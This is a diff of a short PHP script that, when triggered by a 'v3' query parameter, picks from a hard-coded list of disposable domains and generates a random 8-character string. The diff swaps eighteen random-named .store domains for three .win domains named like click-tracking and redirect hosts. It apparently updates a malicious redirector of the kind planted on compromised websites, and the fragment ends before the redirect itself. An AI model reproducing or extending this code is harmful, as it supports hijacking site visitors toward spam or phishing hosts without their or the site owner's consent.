@@ -1,11 +1,7 @@
 <?php
 if (isset($_GET['v3']) && $_GET['v3'] !== '') {
     $domains = [
-        'gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 
-        'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 
-        'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 
-        'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 
-        'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'
+        'usrclicklink.win', 'usrredirecmetto.win', 'usrtrcklnk.win'
     ];
     
     $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
